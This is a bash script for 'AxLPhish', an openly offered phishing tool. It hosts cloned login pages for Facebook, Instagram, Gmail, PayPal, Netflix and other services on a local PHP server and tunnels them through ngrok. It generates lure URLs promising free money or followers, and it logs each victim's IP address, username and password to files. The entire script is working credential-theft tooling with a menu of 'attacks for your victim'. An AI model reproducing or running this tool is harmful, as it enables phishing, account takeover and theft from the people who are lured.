#!/bin/bash

##   AxLPhish 	: 	Latest Automatic Phishing Tool
##   Editor 	: 	Killer 
##   Version 	: 	0.5
##   Github 	: 	https://github.com/axlkiller

##   THANKS TO :
##   Aditya Shakya - https://github.com/adi1090x
##   Moises Tapia - https://github.com/MoisesTapia
##   TheLinuxChoice - https://twitter.com/linux_choice
##   DarksecDevelopers  - https://github.com/DarksecDevelopers
##   Ignitetch  - https://github.com/Ignitetch/AdvPhishing
##   Võ Ngọc Bảo - https://github.com/vongocbao
##   Mustakim Ahmed - https://www.facebook.com/Learn.Termux.009


## If you Copy Then Give the credits :)



##                   GNU GENERAL PUBLIC LICENSE
##                    Version 3, 29 June 2007
##
##    Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
##    Everyone is permitted to copy and distribute verbatim copies
##    of this license document, but changing it is not allowed.
##
##                         Preamble
##
##    The GNU General Public License is a free, copyleft license for
##    software and other kinds of works.
##
##    The licenses for most software and other practical works are designed
##    to take away your freedom to share and change the works.  By contrast,
##    the GNU General Public License is intended to guarantee your freedom to
##    share and change all versions of a program--to make sure it remains free
##    software for all its users.  We, the Free Software Foundation, use the
##    GNU General Public License for most of our software; it applies also to
##    any other work released this way by its authors.  You can apply it to
##    your programs, too.
##
##    When we speak of free software, we are referring to freedom, not
##    price.  Our General Public Licenses are designed to make sure that you
##    have the freedom to distribute copies of free software (and charge for
##    them if you wish), that you receive source code or can get it if you
##    want it, that you can change the software or use pieces of it in new
##    free programs, and that you know you can do these things.
##
##    To protect your rights, we need to prevent others from denying you
##    these rights or asking you to surrender the rights.  Therefore, you have
##    certain responsibilities if you distribute copies of the software, or if
##    you modify it: responsibilities to respect the freedom of others.
##
##    For example, if you distribute copies of such a program, whether
##    gratis or for a fee, you must pass on to the recipients the same
##    freedoms that you received.  You must make sure that they, too, receive
##    or can get the source code.  And you must show them these terms so they
##    know their rights.
##
##    Developers that use the GNU GPL protect your rights with two steps:
##    (1) assert copyright on the software, and (2) offer you this License
##    giving you legal permission to copy, distribute and/or modify it.
##
##    For the developers' and authors' protection, the GPL clearly explains
##    that there is no warranty for this free software.  For both users' and
##    authors' sake, the GPL requires that modified versions be marked as
##    changed, so that their problems will not be attributed erroneously to
##    authors of previous versions.
##
##    Some devices are designed to deny users access to install or run
##    modified versions of the software inside them, although the manufacturer
##    can do so.  This is fundamentally incompatible with the aim of
##    protecting users' freedom to change the software.  The systematic
##    pattern of such abuse occurs in the area of products for individuals to
##    use, which is precisely where it is most unacceptable.  Therefore, we
##    have designed this version of the GPL to prohibit the practice for those
##    products.  If such problems arise substantially in other domains, we
##    stand ready to extend this provision to those domains in future versions
##    of the GPL, as needed to protect the freedom of users.
##
##    Finally, every program is threatened constantly by software patents.
##    States should not allow patents to restrict development and use of
##    software on general-purpose computers, but in those that do, we wish to
##    avoid the special danger that patents applied to a free program could
##    make it effectively proprietary.  To prevent this, the GPL assures that
##    patents cannot be used to render the program non-free.
##
##    The precise terms and conditions for copying, distribution and
##    modification follow.
##
##      Copyright (C) 2021  HTR-TECH (https://github.com/htr-tech)
##


## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Directories
if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi
if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi

## Script termination
exit_on_signal_SIGINT() {
    { printf "\n\n%s\n\n" "${GREEN}:->${RED}!!!  Program Interrupted." 2>&1; reset_color; }
    exit 0
}

exit_on_signal_SIGTERM() {
    { printf "\n\n%s\n\n" "${GREEN}:->${RED}!!!  Program Terminated." 2>&1; reset_color; }
    exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
    return
}

## Kill already running process
kill_pid() {
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof ngrok` ]]; then
		killall ngrok > /dev/null 2>&1
	fi	
}

## Banner
banner() {
	cat <<- EOF
		${WHITE}
		${WHITE}░█▀█░█░█░█░░░█▀█░█░█░▀█▀░█▀▀░█░█
		${BLUE}░█▀█░▄▀▄░█░░░█▀▀░█▀█░░█░░▀▀█░█▀█
		${BLUE}░▀░▀░▀░▀░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀
		${LIME}                        ${WHITE}Version : 0.5
		${GREEN}:->${WHITE} Tool Designed by ${RED} Killer (Gokul.Mahato)${WHITE}
	EOF
}

## Small Banner
banner_small() {
	cat <<- EOF
                ${WHITE}
		${WHITE}░█▀█░█░█░█░░░█▀█░█░█░▀█▀░█▀▀░█░█
		${GREEN}░█▀█░▄▀▄░█░░░█▀▀░█▀█░░█░░▀▀█░█▀█
		${GREEN}░▀░▀░▀░▀░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀${WHITE} 0.5
	EOF
}

## Dependencies
dependencies() {
	echo -e "\n${GREEN}:->${CYAN} Installing required packages..."

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ `command -v proot` ]]; then
            printf ''
        else
			echo -e "\n${GREEN}:->${WHITE} Installing package : ${GREEN}proot${CYAN}"${WHITE}
            pkg install proot resolv-conf -y
        fi
    fi

	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
		echo -e "\n${GREEN}:->${GREEN} Packages already installed."
	else
		pkgs=(php curl wget unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}:->${WHITE} Installing package : ${GREEN}$pkg${CYAN}"${WHITE}
				if [[ `command -v pkg` ]]; then
					pkg install "$pkg" -y
				elif [[ `command -v apt` ]]; then
					apt install "$pkg" -y
				elif [[ `command -v apt-get` ]]; then
					apt-get install "$pkg" -y
				elif [[ `command -v pacman` ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ `command -v dnf` ]]; then
					sudo dnf -y install "$pkg"
				else
					echo -e "\n${GREEN}:->${WHITE} Unsupported package manager, ${GREEN}Install packages manually."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi

}

## Download Ngrok
download_ngrok() {
	url="$1"
	file=`basename $url`
	if [[ -e "$file" ]]; then
		rm -rf "$file"
	fi
	wget --no-check-certificate "$url" > /dev/null 2>&1
	if [[ -e "$file" ]]; then
		unzip "$file" > /dev/null 2>&1
		mv -f ngrok .server/ngrok > /dev/null 2>&1
		rm -rf "$file" > /dev/null 2>&1
		chmod +x .server/ngrok > /dev/null 2>&1
	else
		echo -e "\n${RED}:->${RED} Error occured,${GREEN} Install Ngrok manually."
		{ reset_color; exit 1; }
	fi
}

## Install ngrok
install_ngrok() {
	if [[ -e ".server/ngrok" ]]; then
		echo -e "\n${GREEN}:->${WHITE} Ngrok already installed."
	else
		echo -e "\n${GREEN}:->${CYAN} Installing ngrok..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
		else
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
		fi
	fi

}

## Exit message
msg_exit() {
	{ clear; banner_small; echo; }
	echo -e "${GREENBG}${WHITE} Thank you for using. I hope this tool is useful for you.${RESETBG}\n"
	{ reset_color; exit 0; }
}

## About
about() {
	{ clear; banner_small; echo; }
	cat <<- EOF
		${WHITE}Designer ${WHITE}:  ${GREEN}Gokul Mahato ${WHITE}( ${RED}AxL Killer ${WHITE})
		${WHITE}Github   ${WHITE}:  ${BLUE}https://github.com/axlkiller
		${WHITE}Social   ${WHITE}:  ${BLUE}https://instagram.com/axl.killer
		${WHITE}Version  ${WHITE}:  ${GREEN}0.5

${GREENBG}${WHITE}Thanks   : Team AxL © 2021${RESETBG}



		${WHITE}(${WHITE}00${WHITE})${GREEN} Main Menu     ${WHITE}(${WHITE}99${WHITE})${GREEN} Exit
	EOF

	read -p "${GREEN}:->${MAGENTA} Select an option : ${BLUE}"

	if [[ "$REPLY" == 99 ]]; then
		msg_exit
	elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
		echo -ne "\n${GREEN}:->${CYAN} Returning to main menu..."
		{ sleep 1; main_menu; }
	else
		echo -ne "\n${GREEN}:->${RED} Invalid Option, Try Again..."
		{ sleep 1; about; }
	fi
}

## Setup website and start php server
HOST='127.0.0.1'
PORT='8080'

setup_site() {
	echo -e "\n${GREEN}:->${BLUE} Setting up server..."${WHITE}
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	echo -ne "\n${GREEN}:->${BLUE} Starting PHP server..."${WHITE}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
}

## Get IP address
capture_ip() {
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	echo -e "\n${GREEN}:->${WHITE} Victim's IP : ${GREEN}$IP"
	echo -ne "\n${GREEN}:->${WHITE} Saved in : ${GREEN}ip.txt"
	cat .server/www/ip.txt >> ip.txt
}

## Get credentials
capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
	IFS=$'\n'
	echo -e "\n${GREEN}:->${WHITE} Account : ${GREEN}$ACCOUNT"
	echo -e "\n${GREEN}:->${WHITE} Password : ${GREEN}$PASSWORD"
	echo -e "\n${GREEN}:->${WHITE} Saved in : ${BLUE}usernames.dat"
	cat .server/www/usernames.txt >> usernames.dat
	echo -ne "\n${GREEN}:->${WHITE} Waiting for Next Login Info, ${RED}Ctrl + C ${WHITE}to exit. "
}

## Print data
capture_data() {
	echo -ne "\n${GREEN}:->${WHITE} Waiting for Login Info, ${RED}Ctrl + C ${WHITE}to exit..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${GREEN}:->${BLUE} Victim IP Found !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${GREEN}:->${BLUE} Login info Found !!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

## Start ngrok
start_ngrok() {
	echo -e "\n${GREEN}:->${RED} Initialing... ${GREEN}( ${BLUE}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${GREEN}:->${WHITE} Launching Ngrok..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to Mustakim Ahmed (https://github.com/BDhackers009)
    else
        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
    fi

	{ sleep 8; clear; banner; }
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
	ngrok_url1=${ngrok_url#https://}
	echo -e "\n${GREEN}:->${WHITE} URL 1 : ${BLUE}$ngrok_url"
	echo -e "\n${GREEN}:->${WHITE} URL 2 : ${BLUE}$mask@$ngrok_url1"
	capture_data
}

## Start localhost
start_localhost() {
	echo -e "\n${GREEN}:->${WHITE} Initializing... ${GREEN}( ${BLUE}http://$HOST:$PORT ${GREEN})"
	setup_site
	{ sleep 1; clear; banner; }
	echo -e "\n${GREEN}:-> ${BLUE} Successfully Hosted at : ${GREEN}${BLUE}http://$HOST:$PORT ${GREEN}"
	capture_data
}

## Tunnel selection
tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF



		${WHITE}(${WHITE}01${WHITE})${GREEN} Localhost ${WHITE}(${BLUE}Link work 30%${WHITE})
		${WHITE}(${WHITE}02${WHITE})${GREEN} NgRok  ${WHITE}(${BLUE}Link work 100%${WHITE})
	EOF


	read -p "${GREEN}:->${MAGENTA} Select a port forwarding service : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		start_localhost
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		start_ngrok
	else
		echo -ne "\n${RED}!!!${RED} Invalid Option, Try Again..."
		{ sleep 1; tunnel_menu; }
	fi
}
## Facebook
site_facebook() {
	cat <<- EOF


		${WHITE}(${WHITE}01${WHITE})${GREEN} Facebook Login Page
		${WHITE}(${WHITE}02${WHITE})${GREEN} Security Check Login Page
		${WHITE}(${WHITE}03${WHITE})${GREEN} Messenger Login Page
	EOF


	read -p "${GREEN}:->${MAGENTA} Select an option : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="facebook"
		mask='http://blue-verified-badge-for-facebook-free'
		tunnel_menu
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="fb_security"
		mask='http://make-your-facebook-secured-and-free-from-hackers'
		tunnel_menu
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		website="fb_messenger"
		mask='http://get-messenger-premium-features-free'
		tunnel_menu
	else
		echo -ne "\n${RED}!!!{RED} Invalid Option, Try Again..."
		{ sleep 1; clear; banner_small; site_facebook; }
	fi
}

## Instagram
site_instagram() {
	cat <<- EOF

		${WHITE}[${WHITE}01${WHITE})${GREEN} Instagram Login Page
		${WHITE}[${WHITE}02${WHITE})${GREEN} Auto Followers Login Page
		${WHITE}[${WHITE}03${WHITE})${GREEN} 1000 Followers Login Page
	EOF


	read -p "${GREEN}:->${MAGENTA} Select an option : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="instagram"
		mask='http://get-unlimited-followers-for-instagram'
		tunnel_menu
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="ig_followers"
		mask='http://get-unlimited-followers-for-instagram'
		tunnel_menu
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		website="insta_followers"
		mask='http://get-1000-followers-for-instagram'
		tunnel_menu
	else
		echo -ne "\n${RED}!!!${RED} Invalid Option, Try Again..."
		{ sleep 1; clear; banner_small; site_instagram; }
	fi
}

## Gmail/Google
site_gmail() {
	cat <<- EOF

		${WHITE}(${WHITE}01${WHITE})${GREEN} Gmail Login Page (2018)
		${WHITE}(${WHITE}02${WHITE})${GREEN} Gmail Login Page (2021)
	EOF


	read -p "${GREEN}:->${MAGENTA} Select an option : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="google"
		mask='http://get-unlimited-google-drive-free'
		tunnel_menu
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="google_new"
		mask='http://get-unlimited-google-drive-free'
		tunnel_menu
	else
		echo -ne "\n${RED}!!! Invalid Option, Try Again..."
		{ sleep 1; clear; banner_small; site_gmail; }
	fi
}



## Menu
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN}:->${RED} Select An Attack For Your Victim ${GREEN}<-:${ORANGE}

${WHITE}(${WHITE}01${WHITE})${GREEN} Facebook
${WHITE}(${WHITE}02${WHITE})${GREEN} Instagram 
${WHITE}(${WHITE}03${WHITE})${GREEN} Google
${WHITE}(${WHITE}04${WHITE})${GREEN} Yahoo
${WHITE}(${WHITE}05${WHITE})${GREEN} Twitter
${WHITE}(${WHITE}06${WHITE})${GREEN} Snapchat
${WHITE}(${WHITE}07${WHITE})${GREEN} Spotify
${WHITE}(${WHITE}08${WHITE})${GREEN} Netflix
${WHITE}(${WHITE}09${WHITE})${GREEN} Github
${WHITE}(${WHITE}10${WHITE})${GREEN} Mediafire
${WHITE}(${WHITE}11${WHITE})${GREEN} XBOX
${WHITE}(${WHITE}12${WHITE})${GREEN} Playstation
${WHITE}(${WHITE}13${WHITE})${GREEN} Wordpress
${WHITE}(${WHITE}14${WHITE})${GREEN} Ebay
${WHITE}(${WHITE}15${WHITE})${GREEN} Paypal

 ${WHITE}(${WHITE}99${WHITE})${GREEN} About  ${WHITE}(${WHITE}00${WHITE})${GREEN} Exit
	EOF
	


	read -p "${GREEN}:->${MAGENTA} Select any option : ${BLUE}"


	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		site_facebook
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		site_instagram
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		site_gmail
	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
		website="yahoo"
		mask='http://grab-mail-from-anyother-yahoo-account-free'
		tunnel_menu
	elif [[ "$REPLY" == 5 || "$REPLY" == 05 ]]; then
		website="twitter"
		mask='http://get-blue-badge-on-twitter-free'
		tunnel_menu
	elif [[ "$REPLY" == 6 || "$REPLY" == 06 ]]; then
		website="snapchat"
		mask='http://view-locked-snapchat-accounts-secretly'
		tunnel_menu
	elif [[ "$REPLY" == 7 || "$REPLY" == 07 ]]; then
		website="spotify"
		mask='http://convert-your-account-to-spotify-premium'
		tunnel_menu
	elif [[ "$REPLY" == 8 || "$REPLY" == 08 ]]; then
		website="netflix"
		mask='http://upgrade-your-netflix-plan-free'
		tunnel_menu
	elif [[ "$REPLY" == 9 || "$REPLY" == 09 ]]; then
		website="gitlab"
		mask='http://get-1k-followers-on-gitlab-free'
		tunnel_menu
	elif [[ "$REPLY" == 10 ]]; then
		website="mediafire"
		mask='http://get-1TB-on-mediafire-free'
		tunnel_menu
	elif [[ "$REPLY" == 11 ]]; then
		website="xbox"
		mask='http://get-500-usd-free-to-your-acount'
		tunnel_menu
	elif [[ "$REPLY" == 12 ]]; then
		website="playstation"
		mask='http://playstation-500-usd-gift-card-free'
		tunnel_menu
	elif [[ "$REPLY" == 13 ]]; then
		website="wordpress"
		mask='http://unlimited-wordpress-traffic-free'
		tunnel_menu
	elif [[ "$REPLY" == 14 ]]; then
		website="ebay"
		mask='http://get-500-usd-free-to-your-acount'
		tunnel_menu
	elif [[ "$REPLY" == 15 ]]; then
		website="paypal"
		mask='http://get-500-usd-free-to-your-acount'
		tunnel_menu


	elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
		about
	elif [[ "$REPLY" == 99 ]]; then
		msg_exit

	else
		echo -ne "\n${RED}!!!${RED} Invalid Option, Try Again..."
		{ sleep 1; main_menu; }
	fi
}


## Main
kill_pid
dependencies
install_ngrok
main_menu
